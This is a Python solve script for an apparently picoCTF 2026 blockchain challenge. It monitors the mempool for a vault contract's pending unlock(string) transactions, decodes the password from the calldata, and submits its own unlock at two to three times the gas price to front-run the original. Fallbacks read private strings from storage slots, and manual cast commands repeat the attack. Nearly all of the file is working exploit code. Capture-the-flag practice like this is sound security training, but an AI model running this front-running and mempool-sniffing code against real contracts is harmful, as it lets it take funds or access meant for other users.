#!/usr/bin/env python3
"""
Front_Running - picoCTF 2026 (Blockchain, 300 pts)

Exploit a front-running vulnerability: monitor the mempool for a pending
transaction that reveals a vault's password, then submit our own transaction
with a higher gas price to unlock the vault first and retrieve the flag.

Usage:
    python3 solve.py

Dependencies: web3 (pip install web3)

You will need to fill in the challenge-specific values below:
  - RPC_URL: The Ethereum RPC endpoint provided by the challenge
  - CONTRACT_ADDRESS: The deployed vault contract address
  - PRIVATE_KEY: Your wallet's private key (provided by the challenge)
"""

from web3 import Web3
from web3.contract import Contract
import json
import sys
import time

# ============================================================
# CHALLENGE-SPECIFIC VALUES - Fill these in from the challenge
# ============================================================
RPC_URL = "http://CHALLENGE_HOST:CHALLENGE_PORT"  # e.g., "http://saturn.picoctf.net:12345"
CONTRACT_ADDRESS = "0x_CONTRACT_ADDRESS_HERE"
PRIVATE_KEY = "0x_YOUR_PRIVATE_KEY_HERE"

# If the challenge provides a Setup contract address (to check isSolved)
SETUP_ADDRESS = ""  # Optional: "0x_SETUP_ADDRESS_HERE"

# Typical ABI for a vault contract with front-running vulnerability
VAULT_ABI = json.loads("""[
    {
        "inputs": [{"type": "string", "name": "_password"}],
        "name": "unlock",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "getFlag",
        "outputs": [{"type": "string", "name": ""}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "isUnlocked",
        "outputs": [{"type": "bool", "name": ""}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "secretHash",
        "outputs": [{"type": "bytes32", "name": ""}],
        "stateMutability": "view",
        "type": "function"
    }
]""")

# Function selector for unlock(string) = keccak256("unlock(string)")[:4]
UNLOCK_SELECTOR = None  # Will be computed at runtime


def decode_unlock_calldata(w3, tx_input):
    """
    Decode the calldata of an unlock(string) transaction to extract the password.

    Solidity ABI encoding for unlock(string _password):
      - Bytes 0-3:   function selector (4 bytes)
      - Bytes 4-35:  offset to string data (usually 0x20 = 32)
      - Bytes 36-67: string length
      - Bytes 68+:   string data (padded to 32-byte boundary)
    """
    if isinstance(tx_input, str):
        data = bytes.fromhex(tx_input[2:] if tx_input.startswith("0x") else tx_input)
    else:
        data = bytes(tx_input)

    if len(data) < 68:
        return None

    # Skip the 4-byte function selector
    # Read offset (bytes 4-35) -- usually 32
    # Read string length (bytes 36-67)
    str_length = int.from_bytes(data[36:68], 'big')

    if str_length == 0 or str_length > 1000:
        return None

    # Read string data (bytes 68 onwards)
    password_bytes = data[68:68 + str_length]
    try:
        password = password_bytes.decode('utf-8')
        return password
    except UnicodeDecodeError:
        return None


def get_unlock_selector(w3):
    """Compute the function selector for unlock(string)."""
    return w3.keccak(text="unlock(string)")[:4]


def approach_1_monitor_mempool(w3, contract_address, private_key):
    """
    Approach 1: Monitor the mempool for pending transactions targeting the
    vault contract. When we see an unlock() call, decode the password and
    front-run it with a higher gas price.
    """
    print("[*] === Approach 1: Mempool monitoring ===")
    account = w3.eth.account.from_key(private_key)
    my_address = account.address
    contract = w3.eth.contract(address=contract_address, abi=VAULT_ABI)
    unlock_selector = get_unlock_selector(w3)

    # Check if vault is already unlocked
    try:
        if contract.functions.isUnlocked().call():
            print("[+] Vault is already unlocked!")
            flag = contract.functions.getFlag().call()
            print(f"[+] FLAG: {flag}")
            return flag
    except Exception:
        pass

    print(f"[*] Monitoring mempool for transactions to {contract_address}...")
    print(f"[*] Looking for function selector: {unlock_selector.hex()}")

    # Method A: Use txpool_content RPC (if available)
    try:
        print("[*] Trying txpool_content RPC method...")
        txpool = w3.provider.make_request("txpool_content", [])
        if "result" in txpool:
            pending = txpool["result"].get("pending", {})
            for sender, nonce_txs in pending.items():
                for nonce, tx in nonce_txs.items():
                    if tx.get("to", "").lower() == contract_address.lower():
                        tx_input = tx.get("input", "0x")
                        if tx_input[:10] == "0x" + unlock_selector.hex():
                            password = decode_unlock_calldata(w3, tx_input)
                            if password:
                                print(f"[+] Found password in pending tx from {sender}: {password}")
                                return front_run_with_password(w3, contract, password, account, private_key)
    except Exception as e:
        print(f"[*] txpool_content not available: {e}")

    # Method B: Poll for pending transactions using filter
    try:
        print("[*] Installing pending transaction filter...")
        pending_filter = w3.eth.filter("pending")
        timeout = 120  # Wait up to 120 seconds
        start_time = time.time()

        while time.time() - start_time < timeout:
            try:
                new_entries = pending_filter.get_new_entries()
                for tx_hash in new_entries:
                    try:
                        tx = w3.eth.get_transaction(tx_hash)
                        if tx and tx.get("to") and tx["to"].lower() == contract_address.lower():
                            tx_input = tx.get("input", "0x")
                            if isinstance(tx_input, bytes):
                                tx_input = "0x" + tx_input.hex()
                            if tx_input[:10] == "0x" + unlock_selector.hex():
                                password = decode_unlock_calldata(w3, tx_input)
                                if password:
                                    print(f"[+] Found password in pending tx {tx_hash.hex()}: {password}")
                                    return front_run_with_password(
                                        w3, contract, password, account, private_key,
                                        original_gas_price=tx.get("gasPrice", 0)
                                    )
                    except Exception:
                        continue
            except Exception:
                pass
            time.sleep(0.5)

        print("[!] Timeout waiting for pending transactions")
    except Exception as e:
        print(f"[*] Pending filter not available: {e}")

    # Method C: Check recent blocks for transactions with the password
    print("[*] Checking recent blocks for unlock transactions...")
    latest_block = w3.eth.block_number
    for block_num in range(max(0, latest_block - 50), latest_block + 1):
        try:
            block = w3.eth.get_block(block_num, full_transactions=True)
            for tx in block.transactions:
                if tx.get("to") and tx["to"].lower() == contract_address.lower():
                    tx_input = tx.get("input", "0x")
                    if isinstance(tx_input, bytes):
                        tx_input = "0x" + tx_input.hex()
                    if tx_input[:10] == "0x" + unlock_selector.hex():
                        password = decode_unlock_calldata(w3, tx_input)
                        if password:
                            print(f"[+] Found password in block {block_num}, tx {tx['hash'].hex()}: {password}")
                            return try_unlock(w3, contract, password, account, private_key)
        except Exception:
            continue

    return None


def front_run_with_password(w3, contract, password, account, private_key, original_gas_price=None):
    """
    Submit an unlock transaction with a higher gas price to front-run
    the original transaction.
    """
    print(f"[*] Front-running with password: {password}")

    # Use a higher gas price than the original transaction
    if original_gas_price:
        gas_price = int(original_gas_price * 2)  # 2x the original gas price
    else:
        gas_price = w3.eth.gas_price * 3  # 3x current gas price

    print(f"[*] Using gas price: {gas_price}")

    try:
        tx = contract.functions.unlock(password).build_transaction({
            'from': account.address,
            'nonce': w3.eth.get_transaction_count(account.address),
            'gas': 300000,
            'gasPrice': gas_price,
        })
        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
        print(f"[*] Front-run tx sent: {tx_hash.hex()}")

        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
        print(f"[+] Transaction mined in block {receipt['blockNumber']}")

        if receipt['status'] == 1:
            print("[+] Unlock succeeded!")
            flag = contract.functions.getFlag().call()
            print(f"[+] FLAG: {flag}")
            return flag
        else:
            print("[!] Transaction reverted (may already be unlocked)")
            try:
                flag = contract.functions.getFlag().call()
                print(f"[+] FLAG: {flag}")
                return flag
            except Exception:
                pass
    except Exception as e:
        print(f"[!] Front-run failed: {e}")
    return None


def try_unlock(w3, contract, password, account, private_key):
    """Try to unlock the vault with a known password (non-front-running case)."""
    print(f"[*] Trying to unlock vault with password: {password}")
    try:
        # Check if already unlocked
        if contract.functions.isUnlocked().call():
            print("[+] Vault already unlocked!")
            flag = contract.functions.getFlag().call()
            print(f"[+] FLAG: {flag}")
            return flag

        tx = contract.functions.unlock(password).build_transaction({
            'from': account.address,
            'nonce': w3.eth.get_transaction_count(account.address),
            'gas': 300000,
            'gasPrice': w3.eth.gas_price * 2,
        })
        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)

        if receipt['status'] == 1:
            flag = contract.functions.getFlag().call()
            print(f"[+] FLAG: {flag}")
            return flag
    except Exception as e:
        print(f"[!] Unlock attempt failed: {e}")
    return None


def approach_2_read_storage(w3, contract_address):
    """
    Approach 2: Read the flag directly from contract storage.
    Even if we cannot front-run, the flag may be stored as a 'private'
    variable in the contract, which is always readable on-chain.
    """
    print("\n[*] === Approach 2: Direct storage read ===")
    print("[*] Reading contract storage slots...")

    for slot_num in range(10):
        slot_data = w3.eth.get_storage_at(contract_address, slot_num)
        if slot_data != b'\x00' * 32:
            print(f"    Slot {slot_num}: {slot_data.hex()}")

            # Check if this is a short Solidity string
            last_byte = slot_data[-1]
            if last_byte % 2 == 0 and last_byte > 0:
                str_len = last_byte // 2
                try:
                    decoded = slot_data[:str_len].decode('utf-8')
                    print(f"              -> string: {decoded}")
                    if 'picoCTF' in decoded:
                        print(f"\n[+] FLAG: {decoded}")
                        return decoded
                except Exception:
                    pass

            # Check if this is a long string pointer
            slot_int = int.from_bytes(slot_data, 'big')
            if slot_int % 2 == 1 and slot_int > 1:
                str_len = (slot_int - 1) // 2
                if 0 < str_len < 1000:
                    print(f"              -> long string, length={str_len}")
                    data_slot = int.from_bytes(
                        w3.keccak(slot_num.to_bytes(32, 'big')), 'big'
                    )
                    flag_bytes = b''
                    slots_needed = (str_len + 31) // 32
                    for i in range(slots_needed):
                        chunk = w3.eth.get_storage_at(contract_address, data_slot + i)
                        flag_bytes += chunk
                    try:
                        decoded = flag_bytes[:str_len].decode('utf-8')
                        print(f"              -> data: {decoded}")
                        if 'picoCTF' in decoded:
                            print(f"\n[+] FLAG: {decoded}")
                            return decoded
                    except Exception:
                        pass

    return None


def approach_3_check_pending_block(w3, contract_address, private_key):
    """
    Approach 3: Get the pending block and look through its transactions
    for any calls to the vault contract.
    """
    print("\n[*] === Approach 3: Inspect pending block ===")
    account = w3.eth.account.from_key(private_key)
    contract = w3.eth.contract(address=contract_address, abi=VAULT_ABI)
    unlock_selector = get_unlock_selector(w3)

    try:
        pending_block = w3.eth.get_block('pending', full_transactions=True)
        print(f"[*] Pending block has {len(pending_block.transactions)} transactions")

        for tx in pending_block.transactions:
            if tx.get("to") and tx["to"].lower() == contract_address.lower():
                tx_input = tx.get("input", "0x")
                if isinstance(tx_input, bytes):
                    tx_input = "0x" + tx_input.hex()
                if tx_input[:10] == "0x" + unlock_selector.hex():
                    password = decode_unlock_calldata(w3, tx_input)
                    if password:
                        print(f"[+] Found password in pending block: {password}")
                        return front_run_with_password(
                            w3, contract, password, account, private_key,
                            original_gas_price=tx.get("gasPrice", 0)
                        )
    except Exception as e:
        print(f"[*] Pending block inspection failed: {e}")

    return None


def main():
    print("=" * 60)
    print("  Front_Running - picoCTF 2026 (Blockchain, 300 pts)")
    print("  Vault front-running attack exploit")
    print("=" * 60)

    if "CHALLENGE_HOST" in RPC_URL:
        print()
        print("[!] Please update RPC_URL, CONTRACT_ADDRESS, and PRIVATE_KEY")
        print("[!] with the values provided by the challenge instance.")
        print()
        print("[*] Typical picoCTF blockchain challenge setup:")
        print("    1. Launch the challenge instance to get connection details")
        print("    2. You receive: RPC URL, contract address, private key")
        print("    3. A bot periodically submits unlock(password) transactions")
        print("    4. Monitor the mempool, extract the password, and front-run")
        print()
        print("[*] Example:")
        print('    RPC_URL = "http://saturn.picoctf.net:54321/rpc"')
        print('    CONTRACT_ADDRESS = "0xAbCdEf..."')
        print('    PRIVATE_KEY = "0x1234..."')
        sys.exit(1)

    # Connect to the blockchain
    print(f"\n[*] Connecting to RPC: {RPC_URL}")
    w3 = Web3(Web3.HTTPProvider(RPC_URL))

    if not w3.is_connected():
        print("[!] Failed to connect to RPC endpoint")
        sys.exit(1)

    print(f"[+] Connected! Chain ID: {w3.eth.chain_id}")

    contract_address = Web3.to_checksum_address(CONTRACT_ADDRESS)
    account = w3.eth.account.from_key(PRIVATE_KEY)
    print(f"[*] Our address: {account.address}")
    print(f"[*] Our balance: {w3.eth.get_balance(account.address)} wei")
    print(f"[*] Vault contract: {contract_address}")

    flag = None

    # Approach 1: Monitor mempool and front-run
    flag = approach_1_monitor_mempool(w3, contract_address, PRIVATE_KEY)

    # Approach 2: Read flag directly from storage
    if not flag or 'picoCTF' not in str(flag):
        flag = approach_2_read_storage(w3, contract_address)

    # Approach 3: Check pending block
    if not flag or 'picoCTF' not in str(flag):
        flag = approach_3_check_pending_block(w3, contract_address, PRIVATE_KEY)

    # Print result
    if flag and 'picoCTF' in str(flag):
        print(f"\n{'=' * 60}")
        print(f"  FLAG: {flag}")
        print(f"{'=' * 60}")
    else:
        print("\n[!] Could not retrieve flag automatically.")
        print("[*] Manual steps to try:")
        print("    1. Use 'cast' to inspect pending transactions:")
        print("       cast rpc txpool_content --rpc-url <RPC_URL>")
        print("    2. Decode calldata of unlock() calls:")
        print("       cast calldata-decode 'unlock(string)' <CALLDATA>")
        print("    3. Submit your own unlock() with higher gas:")
        print("       cast send <VAULT> 'unlock(string)' '<PASSWORD>' \\")
        print("         --private-key <KEY> --rpc-url <RPC> --gas-price <HIGH>")


if __name__ == '__main__':
    main()
